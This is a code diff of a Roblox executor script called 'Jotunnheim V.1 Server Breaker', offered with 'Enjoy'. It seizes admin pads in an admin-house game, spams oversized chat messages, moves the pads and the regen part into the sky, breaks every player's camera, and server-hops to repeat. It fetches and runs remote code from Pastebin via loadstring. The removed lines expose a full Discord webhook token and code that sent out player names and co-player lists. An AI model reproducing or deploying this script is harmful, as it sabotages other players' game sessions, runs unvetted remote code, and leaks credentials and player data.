@@ -1,3 +1,7 @@
+-- // Don't know what else to say here other then Enjoy. Also removed my webhook for security reasons.
+-- // Feel free to edit to your liking, also added notes for support.
+
+
 local logo =
     [[
     ___  ________  _________  ___  ___  ________   ________   ___  ___  _______   ___  _____ ______      
@@ -10,28 +14,23 @@ local logo =
                                                                                                                                                                                                                                                      
  ]]
 
+repeat
+    wait()
+until game.Players.LocalPlayer.Character -- // Waits for LocalPlayer to load
 
 repeat
     wait()
-until game.Players.LocalPlayer
-
-repeat
-    wait()
-until game.Players.LocalPlayer.Character
-
-repeat
-    wait()
-until game.Workspace.Terrain["_Game"].Admin
+until game.Workspace.Terrain["_Game"].Admin -- // Waits for Admin respitory to load
 
 local function chat(msg)
     game.Players:Chat(msg)
 end
 
-local ispads = false
+local ispads = false -- // Will be used to check for Pads
 
-coroutine.wrap(
+coroutine.wrap( -- This is to hook rconsole output functions to normal output functions
     function()
-        rconsolename("Jotunnheim V.1 Server Breaker Console")
+        rconsolename("Jotunnheim V.1 Server Breaker Console") 
         hookfunction(
             print,
             function(a)
@@ -59,17 +58,9 @@ coroutine.wrap(
 )()
 
 
-
-local function tp()
-    local tp = game:GetService("TeleportService")
-    local id = game.PlaceId
-    local plr = game.Players.LocalPlayer
-    tp:Teleport(id, plr)
-end
-
 local plr = game.Players.LocalPlayer
 
-local function hop()
+local function hop() -- Pretty self explanatory, serverhopper
     while true do
         local sameservers = false
         local http = game:GetService "HttpService"
@@ -113,7 +104,7 @@ local function hop()
                     end
                 end
             end
-        elseif er then
+        elseif er then -- Outputs HTTP request Errors
             print(er)
             tp()
         else
@@ -124,52 +115,19 @@ local function hop()
     end
 end
 
--- localscript, local time, local script
-local TimeLabel = script.Parent
-local date = os.date("*t")
 
-function getTime()
-    local hour = tonumber(date["hour"])
-    local minute = date["min"]
-    if hour > 12 then
-        hour = hour - 12
-    end
-    if hour == 0 then
-        hour = 12
-    end
-    return (tostring(hour) .. ":" .. minute)
-end
 
-local now = os.time()
-
-local AgsFile = isfile("AgsServers.lua")
-local serverid = game.JobId
-space = "\n"
-
-function logserver(file)
-    file("AgsServers.lua", serverid .. space)
-end
-
-wait()
-if AgsFile then
-    logserver(appendfile)
-else
-    logserver(writefile)
-end
-
-local server = readfile("AgsServers.lua"):split("\n")
-
-if not game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen") then
+if not game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen") then -- Checks if Regen exists
     error("This Server has already been Destroyed, Breaking Camera Because Why The Fuck Not")
     chat("gear all 0004842207161") -- break camera
     hop()
 else
-    if game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen").CFrame.Y > 500 then
+    if game.Workspace.Terrain["_Game"].Admin:FindFirstChild("Regen").CFrame.Y > 500 then -- Checks if Regen's CFrame.Y is below 500
         error("This Server has already been Destroyed, Breaking Camera Because Why The Fuck Not")
     chat("gear all 0004842207161") -- break camera
         hop()
     else
-        for _, pads in pairs(game.Workspace.Terrain["_Game"].Admin.Pads:GetDescendants()) do
+        for _, pads in pairs(game.Workspace.Terrain["_Game"].Admin.Pads:GetDescendants()) do -- Checks if Pads exist
             if pads:IsA("Part") then
                 ispads = true
             end
@@ -191,11 +149,9 @@ else
         local gid = game.JobId
         local ch = plr.Character
         local rs = game:getService("RunService")
-        local url =
-            "https://discord.com/api/webhooks/895754600366350406/REhXVKRR0JyV2fs_WY2gWXtGj62nNvdF0xoN262sFsjUHd-c-BgJ1DoDltwmLMtH8XTN" -- If you can see this, I trust you lol hope I don't regret that
-        local cmsg = "Broken Server: " .. gid
+            
 
-        fireclickdetector(regen.ClickDetector, 0)
+        fireclickdetector(regen.ClickDetector, 0) -- Grabs all pads
         wait(.1)
         coroutine.wrap(
             function()
@@ -211,72 +167,13 @@ else
 
         warn("Grabbed All Pads Successfully!")
 
-        local function chat(msg)
+        local function chat(msg) -- // Chat function
             game.Players:Chat(msg)
         end
 
-        local function web(gs)
-            pcall(
-                function()
-                    function jsone(str)
-                        return http:JSONEncode(str)
-                    end
-                    function sendData(webhook)
-                        local users = {}
-                        for i, v in pairs(plrs:GetPlayers()) do
-                            users[#users + 1] = v.Name
-                        end
-                        users = table.concat(users, "\n")
-                        local Data = {
-                            ["username"] = "Crash Logger",
-                            ["content"] = gs,
-                            ["embeds"] = {
-                                {
-                                    ["author"] = {
-                                        ["name"] = "Profile",
-                                        ["url"] = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"
-                                    },
-                                    ["title"] = plr.Name,
-                                    ["color"] = 12583126,
-                                    ["fields"] = {
-                                        {
-                                            ["name"] = "Display Name",
-                                            ["value"] = plr.DisplayName,
-                                            ["inline"] = true
-                                        },
-                                        {
-                                            ["name"] = "Time",
-                                            ["value"] = getTime(),
-                                            ["inline"] = true
-                                        },
-                                        {
-                                            ["name"] = "Co-Users",
-                                            ["value"] = users,
-                                            ["inline"] = false
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                        local response =
-                            syn.request(
-                            {
-                                Url = webhook,
-                                Method = "POST",
-                                Headers = {
-                                    ["Content-Type"] = "application/json" -- When sending JSON, set this!
-                                },
-                                Body = jsone(Data)
-                            }
-                        )
-                        game:HttpPost(webhook, jsone(Data))
-                    end
-                    sendData(url)
-                end
-            )
-        end
+       
         pcall(function()
-        loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, needed for non perms
+        loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, extra checks to make sure you have admin
         end)
         wait(time)
         chat("respawn others")
@@ -291,13 +188,17 @@ else
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ]]
             chat("m " .. l)
         end
-        warn("Players have been punished, Removing Pads")
+         warn("Players have been punished, Removing Pads")
 
         wait()
 
         chat(".pads")
+            
+            
+            
+            
 
-        for i, v in pairs(Pads:GetChildren()) do
+        for i, v in pairs(Pads:GetChildren()) do -- // Moves Pads to the sky
             repeat
                 wait()
 
@@ -350,7 +251,8 @@ else
 
         warn("Pads have been removed! Moving Regen..")
 
-        repeat
+
+        repeat -- // Moves regen to the sky
             wait()
         until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
         local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -393,8 +295,6 @@ else
         wait(0.2)
 
         warn("Regen Has Been Moved Successfully!")
-
-        web(cmsg) -- send webhook
         wait(.1)
         hop()
     end
